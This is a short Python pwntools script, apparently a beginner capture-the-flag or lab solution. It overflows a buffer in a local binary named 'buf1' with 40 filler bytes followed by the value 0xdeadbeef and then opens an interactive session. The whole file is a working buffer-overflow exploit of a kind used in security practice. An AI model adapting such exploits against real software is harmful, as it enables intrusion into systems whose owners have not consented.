from pwn import *

ex = process('./buf1')
payload = b"a" * 40 + p32(0xdeadbeef) # type: ignore
ex.sendline(payload)
ex.recvline()
ex.interactive()

